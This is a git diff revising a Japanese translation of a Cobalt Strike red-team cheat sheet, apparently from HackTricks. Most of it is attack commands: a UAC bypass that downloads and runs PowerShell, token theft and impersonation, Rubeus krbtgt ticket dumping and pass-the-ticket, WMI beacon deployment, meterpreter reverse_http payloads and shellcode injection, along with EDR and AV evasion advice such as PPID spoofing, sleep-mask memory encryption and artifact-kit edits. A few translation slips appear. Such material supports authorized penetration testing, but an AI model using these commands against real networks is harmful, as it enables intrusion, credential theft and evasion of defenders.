@@ -1,19 +1,21 @@
 # Cobalt Strike
 
+{{#include /banners/hacktricks-training.md}}
+
 ### リスナー
 
 ### C2 リスナー
 
-`Cobalt Strike -> Listeners -> Add/Edit` その後、リスンする場所、使用するビークンの種類（http、dns、smb...）などを選択できます。
+`Cobalt Strike -> Listeners -> Add/Edit` で、リスニングする場所や使用するビークンの種類（http、dns、smb...）などを選択できます。
 
 ### Peer2Peer リスナー
 
 これらのリスナーのビークンは、C2と直接通信する必要はなく、他のビークンを通じて通信できます。
 
-`Cobalt Strike -> Listeners -> Add/Edit` その後、TCPまたはSMBビークンを選択する必要があります。
+`Cobalt Strike -> Listeners -> Add/Edit` で、TCPまたはSMBビークンを選択する必要があります。
 
 * **TCPビークンは選択したポートにリスナーを設定します**。TCPビークンに接続するには、別のビークンから `connect <ip> <port>` コマンドを使用します。
-* **smbビークンは選択した名前のパイプ名でリスンします**。SMBビークンに接続するには、`link [target] [pipe]` コマンドを使用する必要があります。
+* **smbビークンは選択した名前のパイプ名でリスニングします**。SMBビークンに接続するには、`link [target] [pipe]` コマンドを使用する必要があります。
 
 ### ペイロードの生成とホスティング
 
@@ -51,7 +53,7 @@ keylogger [pid] [x86|x64]
 ## 表示 > キーストロークで押されたキーを確認する
 
 # ポートスキャン
-portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内にポートスキャンアクションを注入
+portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # 別のプロセス内でポートスキャンアクションを注入
 portscan [targets] [ports] [arp|icmp|none] [max connections]
 
 # Powershell
@@ -66,7 +68,7 @@ psinject <pid> <arch> <commandlet> <arguments> # これは指定されたプロ�
 # ユーザーの偽装
 ## クレデンシャルを使用したトークン生成
 make_token [DOMAIN\user] [password] # ネットワーク内のユーザーを偽装するためのトークンを作成
-ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
+ls \\computer_name\c$ # 生成したトークンを使用してC$にアクセスを試みる
 rev2self # make_tokenで生成されたトークンの使用を停止
 ## make_tokenの使用はイベント4624を生成します: アカウントが正常にログオンしました。このイベントはWindowsドメインで非常に一般的ですが、ログオンタイプでフィルタリングすることで絞り込むことができます。上記のように、これはLOGON32_LOGON_NEW_CREDENTIALSを使用します（タイプ9）。
 
@@ -79,7 +81,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## make_tokenのようですが、プロセスからトークンを盗む
 steal_token [pid] # これはネットワークアクションに便利で、ローカルアクションには便利ではありません
 ## APIドキュメントから、これは「呼び出し元が現在のトークンをクローンすることを許可する」ログオンタイプであることがわかります。これがビークン出力に「Impersonated <current_username>」と表示される理由です - 自分のクローンされたトークンを偽装しています。
-ls \\computer_name\c$ # 生成したトークンを使用してコンピュータのC$にアクセスを試みる
+ls \\computer_name\c$ # 生成したトークンを使用してC$にアクセスを試みる
 rev2self # steal_tokenからのトークンの使用を停止
 
 ## 新しいクレデンシャルでプロセスを起動
@@ -106,7 +108,7 @@ execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
 execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
 ## 新しいチケットを使用するための新しいログオンセッションを作成します（侵害されたものを上書きしないため）
 make_token <domain>\<username> DummyPass
-## PowerShellセッションから攻撃者のマシンにチケットを書き込み、ロードします
+## 攻撃者のマシンにチケットを書き込み、PowerShellセッションからロードします
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
@@ -119,7 +121,7 @@ steal_token <pid>
 ## チケットを抽出 + チケットを渡す
 ### チケットのリスト
 execute-assembly C:\path\Rubeus.exe triage
-### luidによる興味深いチケットをダンプ
+### 興味深いチケットをluidでダンプ
 execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
 ### 新しいログオンセッションを作成し、luidとprocessidを記録
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
@@ -145,24 +147,24 @@ remote-exec [method] [target] [command] # remote-execは出力を返しません
 ## winrm                           WinRM（PowerShell）経由でリモート実行
 ## wmi                             WMI経由でリモート実行
 
-## wmiを使用してビークンを実行するには（jumpコマンドには含まれていません）、ビークンをアップロードして実行します
+## wmiでビークンを実行するには（jumpコマンドには含まれていません）、ビークンをアップロードして実行します
 beacon> upload C:\Payloads\beacon-smb.exe
 beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
 
-# Metasploitへのセッションの渡し - リスナーを介して
-## Metasploitホスト上で
+# Metasploitにセッションを渡す - リスナー経由
+## Metasploitホストで
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
 msf6 exploit(multi/handler) > set LHOST eth0
 msf6 exploit(multi/handler) > set LPORT 8080
 msf6 exploit(multi/handler) > exploit -j
 
-## Cobalt上で: Listeners > Addを選択し、PayloadをForeign HTTPに設定します。Hostを10.10.5.120、Portを8080に設定し、保存をクリックします。
+## Cobaltで: リスナー > 追加し、ペイロードをForeign HTTPに設定します。ホストを10.10.5.120、ポートを8080に設定し、保存をクリックします。
 beacon> spawn metasploit
-## 外部リスナーを使用してx86 Meterpreterセッションのみを生成できます。
+## 外国のリスナーでx86 Meterpreterセッションのみを生成できます。
 
-# Metasploitへのセッションの渡し - シェルコード注入を介して
-## Metasploitホスト上で
+# Metasploitにセッションを渡す - シェルコード注入経由
+## Metasploitホストで
 msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
 ## msfvenomを実行し、multi/handlerリスナーを準備します。
 
@@ -171,10 +173,10 @@ ps
 shinject <pid> x64 C:\Payloads\msf.bin #x64プロセスにMetasploitシェルコードを注入
 
 # MetasploitセッションをCobalt Strikeに渡す
-## ステージレスビークンシェルコードを生成し、Attacks > Packages > Windows Executable (S)に移動し、希望のリスナーを選択し、出力タイプとしてRawを選択し、x64ペイロードを使用します。
+## ステージレスビークンシェルコードを生成し、Attacks > Packages > Windows Executable (S) に移動し、希望のリスナーを選択し、出力タイプとしてRawを選択し、x64ペイロードを使用します。
 ## Metasploitでpost/windows/manage/shellcode_injectを使用して生成されたCobalt Strikeシェルコードを注入します。
 
-# ピボッティング
+# ピボット
 ## チームサーバーでソックスプロキシを開く
 beacon> socks 1080
 
@@ -185,14 +187,14 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 ### Execute-Assembly
 
-**`execute-assembly`** は、リモートプロセス注入を使用して指定されたプログラムを実行するために**犠牲プロセス**を使用します。これは非常に騒がしく、プロセス内に注入するために特定のWin APIが使用され、すべてのEDRがチェックしています。しかし、同じプロセスに何かをロードするために使用できるカスタムツールもいくつかあります：
+**`execute-assembly`** は、リモートプロセス注入を使用して指定されたプログラムを実行する**犠牲プロセス**を使用します。これは非常に騒がしく、プロセス内に注入するために特定のWin APIが使用され、すべてのEDRがチェックしています。しかし、同じプロセス内に何かをロードするために使用できるカスタムツールもいくつかあります：
 
 - [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 - Cobalt Strikeでは、BOF（Beacon Object Files）も使用できます: [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
 - [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
 
-アグレッサースクリプト `https://github.com/outflanknl/HelpColor` は、Cobalt Strikeに `helpx` コマンドを作成し、コマンドに色を付けてBOFs（緑）、Frok&Run（黄色）などを示し、プロセス実行、注入、またはそれに類似するもの（赤）を示します。これにより、どのコマンドがよりステルスであるかを知るのに役立ちます。
+アグレッサースクリプト `https://github.com/outflanknl/HelpColor` は、Cobalt Strikeで `helpx` コマンドを作成し、コマンドに色を付けてBOF（緑）、Frok&Run（黄）、またはプロセス実行、注入、または類似のもの（赤）を示します。これにより、どのコマンドがよりステルスであるかを知るのに役立ちます。
 
 ### ユーザーとして行動する
 
@@ -201,13 +203,13 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 - セキュリティEID 4624 - 通常の操作時間を知るためにすべてのインタラクティブログオンを確認します。
 - システムEID 12,13 - シャットダウン/起動/スリープの頻度を確認します。
 - セキュリティEID 4624/4625 - 有効/無効なNTLM試行を確認します。
-- セキュリティEID 4648 - プレーンテキストのクレデンシャルがログオンに使用されたときにこのイベントが生成されます。プロセスが生成した場合、バイナリは構成ファイルまたはコード内にクリアテキストのクレデンシャルを持っている可能性があります。
+- セキュリティEID 4648 - プレーンテキストのクレデンシャルがログオンに使用されたときにこのイベントが生成されます。プロセスが生成した場合、バイナリは構成ファイル内またはコード内にプレーンテキストのクレデンシャルを持っている可能性があります。
 
 Cobalt Strikeから `jump` を使用する場合、新しいプロセスをより正当なものに見せるために `wmi_msbuild` メソッドを使用する方が良いです。
 
 ### コンピュータアカウントを使用する
 
-防御者がユーザーから生成された奇妙な動作をチェックしていることが一般的であり、**サービスアカウントやコンピュータアカウント（`*$`など）を監視から除外する**ことがよくあります。これらのアカウントを使用して横移動や特権昇格を行うことができます。
+防御者がユーザーから生成された奇妙な動作をチェックしていることが一般的であり、**サービスアカウントやコンピュータアカウント（`*$`など）を監視から除外する**ことがあります。これらのアカウントを使用して横移動や特権昇格を行うことができます。
 
 ### ステージレスペイロードを使用する
 
@@ -240,7 +242,7 @@ ADでは、チケットの暗号化に注意してください。デフォルト
 
 ### デフォルトを避ける
 
-Cobalt Strikeを使用する際、デフォルトではSMBパイプの名前は `msagent_####` および `"status_####` になります。これらの名前を変更してください。Cobalt Strikeから既存のパイプの名前を確認するには、コマンド: `ls \\.\pipe\` を使用します。
+Cobalt Strikeを使用する際、デフォルトでSMBパイプは `msagent_####` および `"status_####` という名前になります。これらの名前を変更してください。Cobalt Strikeから既存のパイプの名前を確認するには、コマンド: `ls \\.\pipe\` を使用します。
 
 さらに、SSHセッションでは `\\.\pipe\postex_ssh_####` というパイプが作成されます。これを `set ssh_pipename "<new_name>";` で変更します。
 
@@ -258,15 +260,15 @@ Cobalt Strikeプロファイルでは、次のようなことも変更できま�
 
 ### メモリスキャンのバイパス
 
-一部のEDRは、既知のマルウェアシグネチャのためにメモリをスキャンします。Cobalt Strikeは、バックドアをメモリ内で暗号化できる `sleep_mask` 関数をBOFとして変更することを許可します。
+一部のERDは、既知のマルウェアシグネチャのためにメモリをスキャンします。Cobalt Strikeは、バックドアをメモリ内で暗号化できる `sleep_mask` 関数をBOFとして変更することを許可します。
 
 ### 騒がしいプロセス注入
 
-プロセスにコードを注入する際、通常は非常に騒がしいです。これは、**通常のプロセスがこのアクションを実行しないため、またこの方法が非常に限られているため**です。したがって、行動ベースの検出システムによって検出される可能性があります。さらに、EDRがネットワークをスキャンして**ディスクに存在しないコードを含むスレッド**を探している場合にも検出される可能性があります（ただし、ブラウザなどのプロセスはJITを使用していることが一般的です）。例: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
+プロセスにコードを注入する際、通常は非常に騒がしいです。これは、**通常のプロセスがこのアクションを実行しないため、またこの方法が非常に限られているため**です。したがって、行動ベースの検出システムによって検出される可能性があります。さらに、EDRがネットワークをスキャンして**ディスクに存在しないコードを含むスレッド**を探している場合にも検出される可能性があります（ただし、JITを使用するブラウザなどのプロセスはこれを一般的に使用しています）。例: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)
 
 ### Spawnas | PIDとPPIDの関係
 
-新しいプロセスを生成する際には、検出を避けるために**通常の親子関係**を維持することが重要です。svchost.execがiexplorer.exeを実行している場合、これは疑わしく見えます。なぜなら、svchost.exeは通常のWindows環境ではiexplorer.exeの親ではないからです。
+新しいプロセスを生成する際には、**プロセス間の通常の親子関係を維持することが重要**です。これにより、検出を避けることができます。svchost.execがiexplorer.exeを実行している場合、これは疑わしく見えます。なぜなら、svchost.exeは通常のWindows環境ではiexplorer.exeの親ではないからです。
 
 Cobalt Strikeで新しいビークンが生成されると、デフォルトで**`rundll32.exe`**を使用するプロセスが作成され、新しいリスナーを実行します。これはあまりステルスではなく、EDRによって簡単に検出される可能性があります。さらに、`rundll32.exe`は引数なしで実行され、さらに疑わしくなります。
 
@@ -282,7 +284,7 @@ spawnto x86 svchost.exe
 
 さらに、パス・ザ・ハッシュやパス・ザ・チケット攻撃を行う際、攻撃者が**自分のLSASSプロセスにこのハッシュやチケットを追加する**方が、被害者のマシンのLSASSプロセスを変更するよりもステルス性が高いことがあります。
 
-しかし、**生成されるトラフィックに注意する必要があります**。バックドアプロセスから珍しいトラフィック（Kerberos？）を送信している可能性があるためです。このため、ブラウザプロセスにピボットすることができます（ただし、プロセスに自分を注入して捕まる可能性があるため、ステルスな方法を考えてください）。
+しかし、**生成されるトラフィックに注意する必要があります**。バックドアプロセスから珍しいトラフィック（Kerberos？）を送信している可能性があるためです。これを回避するために、ブラウザプロセスにピボットすることができます（ただし、プロセスに自分を注入して捕まる可能性があるため、ステルスな方法を考慮してください）。
 ```bash
 
 ### Avoiding AVs
@@ -345,14 +347,17 @@ neo4j.bat console
 http://localhost:7474/ --> パスワードを変更  
 execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  
 
-# Change powershell  
+# PowerShellを変更  
 C:\Tools\cobaltstrike\ResourceKit  
 template.x64.ps1  
 # $var_code を $polop に変更  
 # $x --> $ar  
-cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  
+cobalt strike --> スクリプトマネージャー --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  
 
-#artifact kit  
+# アーティファクトキット  
 cd  C:\Tools\cobaltstrike\ArtifactKit  
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
+
+
+{{#include /banners/hacktricks-training.md}}
